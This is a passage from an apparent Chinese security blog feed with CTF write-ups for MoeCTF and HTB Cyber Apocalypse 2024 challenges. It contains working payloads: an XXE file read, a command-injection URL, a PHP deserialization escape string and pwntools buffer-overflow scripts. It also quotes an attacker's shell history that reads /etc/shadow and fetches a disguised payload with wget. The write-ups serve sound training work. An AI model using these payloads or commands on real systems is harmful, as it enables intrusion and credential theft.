href="https://www.cnblogs.com/l-yf/p/13879730.html">前端实现简单的聊天页面    </a></p><p>挺有意思的这题，flag在撤回的消息里</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713214243754.png" alt="image-20240713214243754"></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>附件有api说明</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713221253070.png" alt="image-20240713221253070"></p><p>尝试通过register接口改admin用户密码登admin用户，没成功。爆破admin用户密码读flag没成功。直接伪造cookie变admin的权限读flag不成功。</p><p>这题写死了是必须先伪造admin权限登录再访问flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713221438200.png" alt="image-20240713221438200"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713221450384.png" alt="image-20240713221450384"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713221458665.png" alt="image-20240713221458665"></p><h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><p>写脚本了。</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713222152349.png" alt="image-20240713222152349"></p><p>额,延迟太高了，完不成0.5s内反应，我写的没法测试，放一个别人的脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">import bs4</span><br><span class="line"></span><br><span class="line">url = &quot;这里写网址&quot;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req(driver, steering_control, throttle):</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;driver&quot;: driver,  # 选手</span><br><span class="line">        &quot;steering_control&quot;: steering_control,  # 方向</span><br><span class="line">        &quot;throttle&quot;: throttle  # 油门</span><br><span class="line">    &#125;</span><br><span class="line">    resp = session.post(url, data=data)</span><br><span class="line">    return resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def tq(text):</span><br><span class="line">    bs4_text = bs4.BeautifulSoup(text, &quot;html.parser&quot;).find(&quot;h3&quot;).text</span><br><span class="line">    print(bs4_text)</span><br><span class="line">    return bs4_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pd(text):</span><br><span class="line">    if &quot;失误&quot; in text:</span><br><span class="line">        return False, False</span><br><span class="line">    if &quot;向右&quot; in text:</span><br><span class="line">        steering_control = -1</span><br><span class="line">    elif &quot;直行&quot; in text:</span><br><span class="line">        steering_control = 0</span><br><span class="line">    elif &quot;向左&quot; in text:</span><br><span class="line">        steering_control = 1</span><br><span class="line">    if &quot;太小&quot; in text:</span><br><span class="line">        throttle = 0</span><br><span class="line">    elif &quot;保持&quot; in text:</span><br><span class="line">        throttle = 1</span><br><span class="line">    elif &quot;太大&quot; in text:</span><br><span class="line">        throttle = 2</span><br><span class="line">    return steering_control, throttle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    steering_control = 1</span><br><span class="line">    throttle = -1</span><br><span class="line">    count = 0</span><br><span class="line">    for i in range(7):</span><br><span class="line">        count+=1</span><br><span class="line">        text = req(666666, steering_control, throttle)</span><br><span class="line">        if &quot;完美&quot; in text:</span><br><span class="line">            print(text)</span><br><span class="line">            return 0</span><br><span class="line">        a, b = pd(tq(text))</span><br><span class="line">        if a is False:</span><br><span class="line">            return 0</span><br><span class="line">        # print(a,b)</span><br><span class="line">        steering_control, throttle = a, b</span><br><span class="line">        print(count)</span><br><span class="line">    session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713231819447.png" alt="image-20240713231819447"></p><h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p>文件上传，检查Content-Type: image&#x2F;png和文件名第一个.后的拓展名是否为png</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714163958363.png" alt="image-20240714163958363"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714164014931.png" alt="image-20240714164014931"></p><h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><p>xxe 读flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714165107496.png" alt="image-20240714165107496"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;name&gt;&amp;goodies;&lt;/name&gt;</span><br><span class="line">&lt;/creds&gt;</span><br><span class="line"></span><br><span class="line">%3C%3Fxml+version%3D%221.0%22+encoding%3D%22utf-8%22%3F%3E%0A%3C%21DOCTYPE+creds+%5B%0A%3C%21ENTITY+goodies+SYSTEM+%22file%3A%2F%2F%2Fflag%22%3E%0A%5D%3E%0A%3Ccreds%3E%0A++++%3Cname%3E%26goodies%3B%3C%2Fname%3E%0A%3C%2Fcreds%3E</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714165132149.png" alt="image-20240714165132149"></p><h3 id="meo图床2"><a href="#meo图床2" class="headerlink" title="meo图床2"></a>meo图床2</h3><p>上传后发现是任意文件读取</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714170737532.png" alt="image-20240714170737532"></p><p>提示一个文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714170803822.png" alt="image-20240714170803822"></p><p>md5弱比较</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714170836078.png" alt="image-20240714170836078"></p><h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><p>chant可控，Make_a_Move存在字符串替换，字符串逃逸反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714171448494.png" alt="image-20240714171448494"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714171502695.png" alt="image-20240714171502695"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714171622699.png" alt="image-20240714171622699"></p><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>题目给了源码</p><p>这题考察一个异或和弱类型比较绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from secrets import users, salt</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">import http.server</span><br><span class="line"></span><br><span class="line">with open(&quot;flag.txt&quot;,&quot;r&quot;) as f:</span><br><span class="line">    FLAG = f.read().strip()</span><br><span class="line"></span><br><span class="line"># 遍历值异或后hex</span><br><span class="line">def gethash(*items):</span><br><span class="line">    c = 0</span><br><span class="line">    for item in items:</span><br><span class="line">        if item is None:</span><br><span class="line">            continue</span><br><span class="line">        c ^= int.from_bytes(hashlib.md5(f&quot;&#123;salt&#125;[&#123;item&#125;]&#123;salt&#125;&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?</span><br><span class="line">    return hex(c)[2:]</span><br><span class="line"></span><br><span class="line"># 判断&quot;admin&quot;:&quot;admin&quot;是否在users中</span><br><span class="line">assert &quot;admin&quot; in users</span><br><span class="line">assert users[&quot;admin&quot;] == &quot;admin&quot;</span><br><span class="line"></span><br><span class="line"># &quot;admin&quot;:&quot;admin&quot;的结果是&#123;&#x27;admin&#x27;: &#x27;0&#x27;&#125; 相同的值异或为0 任何值和0异或等于它本身</span><br><span class="line">hashed_users = dict((k,gethash(k,v)) for k,v in users.items())</span><br><span class="line"></span><br><span class="line">eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&quot;big&quot;,signed=True).decode().translate(&#123;ord(c):None for c in &quot;\x00&quot;&#125;)) # what is it?</span><br><span class="line">    </span><br><span class="line">def decrypt(data:str):</span><br><span class="line">        for x in range(5):</span><br><span class="line">            data = base64.b64encode(data).decode() # ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line">__page__ = base64.b64encode(&quot;页面源码，太长了我删了&quot;)</span><br><span class="line">        </span><br><span class="line">class MyHandler(http.server.BaseHTTPRequestHandler):</span><br><span class="line">    def do_GET(self):</span><br><span class="line">        try:</span><br><span class="line">            if self.path == &quot;/&quot;:</span><br><span class="line">                self.send_response(200)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(__page__)</span><br><span class="line">            else:</span><br><span class="line">                self.send_response(404)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(b&quot;404 Not Found&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            self.send_response(500)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(b&quot;500 Internal Server Error&quot;)</span><br><span class="line"></span><br><span class="line">    def do_POST(self):</span><br><span class="line">        try:</span><br><span class="line">            if self.path == &quot;/login&quot;:</span><br><span class="line">                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))</span><br><span class="line">                payload = json.loads(body)</span><br><span class="line">                params = json.loads(decrypt(payload[&quot;params&quot;]))</span><br><span class="line">                print(params)</span><br><span class="line">                # 用户名不能为admin</span><br><span class="line">                if params.get(&quot;username&quot;) == &quot;admin&quot;:</span><br><span class="line">                    self.send_response(403)</span><br><span class="line">                    self.end_headers()</span><br><span class="line">                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)</span><br><span class="line">                    print(&quot;admin&quot;)</span><br><span class="line">                    return</span><br><span class="line">                # 用户名密码不能相同</span><br><span class="line">                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):</span><br><span class="line">                    self.send_response(403)</span><br><span class="line">                    self.end_headers()</span><br><span class="line">                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)</span><br><span class="line">                    print(&quot;same&quot;)</span><br><span class="line">                    return</span><br><span class="line">                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))</span><br><span class="line">                for k,v in hashed_users.items():</span><br><span class="line">                    # 弱比较hashed和hashed_users中hashed的值</span><br><span class="line">                    if hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            &quot;user&quot;:k,</span><br><span class="line">                            &quot;hash&quot;:hashed,</span><br><span class="line">                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br><span class="line">                        &#125;</span><br><span class="line">                        self.send_response(200)</span><br><span class="line">                        self.end_headers()</span><br><span class="line">                        self.wfile.write(json.dumps(data).encode())</span><br><span class="line">                        print(&quot;success&quot;)</span><br><span class="line">                        return</span><br><span class="line">                self.send_response(403)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(b&quot;Invalid username or password&quot;)</span><br><span class="line">            else:</span><br><span class="line">                self.send_response(404)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(b&quot;404 Not Found&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            self.send_response(500)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(b&quot;500 Internal Server Error&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server = http.server.HTTPServer((&quot;&quot;, 9999), MyHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>因为不比较用户名，所以用户名只要不为admin就行，但是因为要又要让用户密码相同得到hashed为0的结果，所以需要用户和密码的类型分别为字符串和数字</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714200352484.png" alt="image-20240714200352484"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB cyber-apocalypse-2024</title>
      <link href="/2024/07/09/Hack%20The%20Box%20CTF/"/>
      <url>/2024/07/09/Hack%20The%20Box%20CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-cyber-apocalypse-2024"><a href="#HTB-cyber-apocalypse-2024" class="headerlink" title="HTB cyber-apocalypse-2024"></a>HTB cyber-apocalypse-2024</h1><p>附件解压密码统一为hackthebox</p><p>部分环境是web环境，部分是pwn环境（nc连接）</p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="Welcome-to-CTF"><a href="#Welcome-to-CTF" class="headerlink" title="Welcome to CTF"></a>Welcome to CTF</h3><p>HTB{onboard1ng_fl4g}</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709154143591.png" alt="image-20240709154143591"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="TimeKORP"><a href="#TimeKORP" class="headerlink" title="TimeKORP"></a>TimeKORP</h3><p>下载附件，压缩包密码统一为hackthebox，分析源码，命令执行</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709154408342.png" alt="image-20240709154408342"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://94.237.53.113:41219/?format=%s%27;cat%20/flag;%27</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709154437033.png" alt="image-20240709154437033"></p><h3 id="Flag-Command"><a href="#Flag-Command" class="headerlink" title="Flag Command"></a>Flag Command</h3><p>小游戏，接口有个secret步骤，输入<strong>Blip-blop, in a pickle with a hiccup! Shmiggity-shmack</strong>就能通关</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709160202909.png" alt="image-20240709160202909"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709160327616.png" alt="image-20240709160327616"></p><h3 id="Labyrinth-Linguist"><a href="#Labyrinth-Linguist" class="headerlink" title="Labyrinth Linguist"></a>Labyrinth Linguist</h3><p>java Velocity ssti</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709165647212.png" alt="image-20240709165647212"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709165700566.png" alt="image-20240709165700566"></p><p>tplmap一把嗦</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240709165723896.png" alt="image-20240709165723896"></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="An-unusual-sighting"><a href="#An-unusual-sighting" class="headerlink" title="An unusual sighting"></a>An unusual sighting</h3><p>直接看附件的sshd.log和bash_history.txt</p><p>黑客2.67.182.119:60071在2024-02-19 04:00:14连接服务器100.107.36.130:2221，公钥连接错误，ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4，使用密码登录成功，在2024-02-19 04:38:17结束连接</p><p>期间执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2024-02-19 04:00:18] whoami</span><br><span class="line">[2024-02-19 04:00:20] uname -a</span><br><span class="line">[2024-02-19 04:00:40] cat /etc/passwd</span><br><span class="line">[2024-02-19 04:01:01] cat /etc/shadow</span><br><span class="line">[2024-02-19 04:01:15] ps faux</span><br><span class="line">[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz</span><br><span class="line">[2024-02-19 04:10:02] tar xvf latest.tar.gz</span><br><span class="line">[2024-02-19 04:12:02] shred -zu latest.tar.gz</span><br><span class="line">[2024-02-19 04:14:02] ./setup</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710134512893.png" alt="image-20240710134512893"></p><h3 id="Phreaky"><a href="#Phreaky" class="headerlink" title="Phreaky"></a>Phreaky</h3><blockquote><p>In the shadowed realm where the Phreaks hold sway,<br>A mole lurks within, leading them astray.<br>Sending keys to the Talents, so sly and so slick,<br>A network packet capture must reveal the trick.<br>Through data and bytes, the sleuth seeks the sign,<br>Decrypting messages, crossing the line.<br>The traitor unveiled, with nowhere to hide,<br>Betrayal confirmed, they’d no longer abide.</p></blockquote><p>在smtp协议中发现有发送zip附件的15封邮件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710171219162.png" alt="image-20240710171219162"></p><p>全部导出用密码解压，得到phreaks_plan.pdf.part1到15</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710171310481.png" alt="image-20240710171310481"></p><p>010查看，应该是要将每个的数据放到一个pdf文件中即可复原</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710171425929.png" alt="image-20240710171425929"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710171433985.png" alt="image-20240710171433985"></p><p>脚本恢复</p><p>files.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phreaks_plan.pdf.part1</span><br><span class="line">phreaks_plan.pdf.part2</span><br><span class="line">phreaks_plan.pdf.part3</span><br><span class="line">phreaks_plan.pdf.part4</span><br><span class="line">phreaks_plan.pdf.part5</span><br><span class="line">phreaks_plan.pdf.part6</span><br><span class="line">phreaks_plan.pdf.part7</span><br><span class="line">phreaks_plan.pdf.part8</span><br><span class="line">phreaks_plan.pdf.part9</span><br><span class="line">phreaks_plan.pdf.part10</span><br><span class="line">phreaks_plan.pdf.part11</span><br><span class="line">phreaks_plan.pdf.part12</span><br><span class="line">phreaks_plan.pdf.part13</span><br><span class="line">phreaks_plan.pdf.part14</span><br><span class="line">phreaks_plan.pdf.part15</span><br></pre></td></tr></table></figure><p>ex.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ ! -f files.txt ]; then</span><br><span class="line">    echo &quot;Error: files.txt not found.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ ! -f phreaks_plan.pdf ]; then</span><br><span class="line">    touch phreaks_plan.pdf</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">while IFS= read -r filename; do</span><br><span class="line">    if [ -f &quot;$filename&quot; ]; then</span><br><span class="line">        cat &quot;$filename&quot; &gt;&gt; phreaks_plan.pdf</span><br><span class="line">        echo &quot;Content of $filename appended to phreaks_plan.pdf&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Error: $filename not found.&quot;</span><br><span class="line">    fi</span><br><span class="line">done &lt; files.txt</span><br><span class="line"></span><br><span class="line">echo &quot;All files processed.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710192853877.png" alt="image-20240710192853877"></p><h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h2><h3 id="LootStash"><a href="#LootStash" class="headerlink" title="LootStash"></a>LootStash</h3><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710223737223.png" alt="image-20240710223737223"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Character"><a href="#Character" class="headerlink" title="Character"></a>Character</h3><p>写pwn交互式脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def get_index(p, answer,x):</span><br><span class="line">    p.sendline(f&quot;&#123;x&#125;&quot;)</span><br><span class="line">    answers = []</span><br><span class="line">    answer = str(p.recvuntil(b&#x27;Which character (index) of the flag do you want? Enter an index: &#x27;))</span><br><span class="line">    answer = answer.split(&quot;\\n&quot;)[0].split(&quot;: &quot;)[1]</span><br><span class="line">    answers.append(answer)</span><br><span class="line">    return &quot;&quot;.join(answers)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;94.237.59.199&#x27;, &#x27;45604&#x27;)</span><br><span class="line">rcv = str(p.recvuntil(b&#x27;Which character (index) of the flag do you want? Enter an index: &#x27;))</span><br><span class="line">answers = []</span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">answer = str(p.recvuntil(b&#x27;Which character (index) of the flag do you want? Enter an index: &#x27;))</span><br><span class="line">answer = answer.split(&quot;\\n&quot;)[0].split(&quot;: &quot;)[1]</span><br><span class="line">answers.append(answer)</span><br><span class="line">answer=&#x27;&#x27;</span><br><span class="line">try:</span><br><span class="line">    for x in range(110):</span><br><span class="line">        answer+=get_index(p, answer, x)</span><br><span class="line">        </span><br><span class="line">except:</span><br><span class="line">    success(f&quot;Flag is : &#123;answer&#125;&quot;)</span><br><span class="line">    sys.exit(0)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710225309870.png" alt="image-20240710225309870"></p><h3 id="Stop-Drop-and-Roll"><a href="#Stop-Drop-and-Roll" class="headerlink" title="Stop Drop and Roll"></a>Stop Drop and Roll</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def repeat_test(p):</span><br><span class="line">    try:</span><br><span class="line">        rcv = str(p.recvuntil(b&#x27;What do you do? &#x27;))</span><br><span class="line">        question = rcv[2:].split(&quot;\\n&quot;)[0]</span><br><span class="line">        moves = question.split(&quot;,&quot;)</span><br><span class="line">        answer = []</span><br><span class="line">        for move in moves:</span><br><span class="line">            answer.append(actions[move.strip()])</span><br><span class="line">        info(f&quot;Question is &#123;question&#125;&quot;)</span><br><span class="line">        answer=&quot;-&quot;.join(answer)</span><br><span class="line">        info(f&quot;Answered with &#123;answer&#125;&quot;)</span><br><span class="line">        p.sendline(answer)</span><br><span class="line">    except:</span><br><span class="line">        rcv = str(p.recvuntil(b&#x27;&#125;&#x27;))</span><br><span class="line">        success(&quot;Flag is : %s&quot;, rcv)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">actions = &#123;&quot;GORGE&quot;:&quot;STOP&quot;,&quot;PHREAK&quot;:&quot;DROP&quot;,&quot;FIRE&quot;:&quot;ROLL&quot;&#125;</span><br><span class="line">p = remote(&#x27;94.237.58.148&#x27;, &#x27;37170&#x27;)</span><br><span class="line">print(p.recvuntil(b&#x27;Are you ready? (y/n)&#x27;))</span><br><span class="line">p.sendline(&quot;y&quot;)</span><br><span class="line">rcv = str(p.recvuntil(b&#x27;What do you do? &#x27;))</span><br><span class="line">question = rcv.split(&quot;\\n&quot;)[1]</span><br><span class="line">moves = question.split(&quot;,&quot;)</span><br><span class="line">answer = []</span><br><span class="line">for move in moves:</span><br><span class="line">    answer.append(actions[move.strip()])</span><br><span class="line">info(f&quot;Question is &#123;question&#125;&quot;)</span><br><span class="line">answer=&quot;-&quot;.join(answer)</span><br><span class="line">info(f&quot;Answered with &#123;answer&#125;&quot;)</span><br><span class="line">p.sendline(answer)</span><br><span class="line">for i in range(1000):</span><br><span class="line">    repeat_test(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710230427661.png" alt="image-20240710230427661"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Dynastic"><a href="#Dynastic" class="headerlink" title="Dynastic"></a>Dynastic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">def to_identity_map(a):</span><br><span class="line">    return ord(a) - 0x41</span><br><span class="line"></span><br><span class="line">def from_identity_map(a):</span><br><span class="line">    return chr(a % 26 + 0x41)</span><br><span class="line"></span><br><span class="line">def decrypt(c):</span><br><span class="line">    m = &#x27;&#x27;</span><br><span class="line">    for i in range(len(c)):</span><br><span class="line">        ch = c[i]</span><br><span class="line">        if not ch.isalpha():</span><br><span class="line">            mch = ch</span><br><span class="line">        else:</span><br><span class="line">            mch = from_identity_map(to_identity_map(ch) - i)</span><br><span class="line">        m += mch</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line"># 测试解密函数</span><br><span class="line"># 假设我们有一个加密后的字符串</span><br><span class="line">encrypted_message = &quot;DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL&quot;</span><br><span class="line">original_message = decrypt(encrypted_message)</span><br><span class="line">print(&quot;解密后的字符串是:&quot;, original_message)</span><br></pre></td></tr></table></figure><p>FLAG包上HTB{}</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710231147638.png" alt="image-20240710231147638"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>题目是引导学习栈溢出&#x3D;.&#x3D;，很简单的算个偏移量改个地址即可</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710232033140.png" alt="image-20240710232033140"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3.8</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">You need to install pwntools to run the script.</span><br><span class="line">To run the script: python3 ./wrapper.py</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># Library</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Open connection</span><br><span class="line">IP= &#x27;94.237.49.212&#x27; # Change this</span><br><span class="line">PORT = 52839      # Change this</span><br><span class="line"></span><br><span class="line">r= remote(IP, PORT)</span><br><span class="line"></span><br><span class="line"># Craft payload</span><br><span class="line">payload = b&#x27;A&#x27; * (0x30 + 8) # Change the number of &quot;A&quot;s</span><br><span class="line"></span><br><span class="line"># Send payload</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"># Read flag</span><br><span class="line">success(f&#x27;Flag --&gt; &#123;r.recvline_contains(b&quot;HTB&quot;).strip().decode()&#125;&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710232049582.png" alt="image-20240710232049582"></p><h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3.8</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">You need to install pwntools to run the script.</span><br><span class="line">To run the script: python3 ./wrapper.py</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># Library</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Open connection</span><br><span class="line">IP= &#x27;83.136.254.169&#x27; # Change this</span><br><span class="line">PORT = 54745      # Change this</span><br><span class="line"></span><br><span class="line">r= remote(IP, PORT)</span><br><span class="line"></span><br><span class="line"># Craft payload</span><br><span class="line">payload = b&#x27;a&#x27;*0x30+p64(0x404100)+p64(0x401259) # Change the number of &quot;A&quot;s</span><br><span class="line"># print(payload)</span><br><span class="line"># Send payload</span><br><span class="line">r.sendlineafter(&quot;&gt;&gt;&quot;,&quot;69&quot;)</span><br><span class="line">r.sendlineafter(&quot;&gt;&gt;&quot;,payload)</span><br><span class="line">#</span><br><span class="line"># # Read flag</span><br><span class="line">success(f&#x27;Flag --&gt; &#123;r.recvline_contains(b&quot;HTB&quot;).strip().decode()&#125;&#x27;)</span><br><span class="line"># r.interactive()</span><br></pre></td></tr></table></figure><h3 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h3><h2 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h2><h3 id="Critical-Flight"><a href="#Critical-Flight" class="headerlink" title="Critical Flight"></a>Critical Flight</h3><p>使用GerberLogix查看,类似选择图层</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711141904127.png" alt="image-20240711141904127"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTB&#123;533_7h3_1nn32_w02k1n95_0f_313c720n1c5#$@&#125;</span><br></pre></td></tr></table></figure><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p><a href="https://medium.com/@ennoukhbadr/hardware-hacking-hackthebox-debugging-interface-c374a50c1b18">Hardware Hacking | HackTheBox Debugging Interface</a></p><p><img 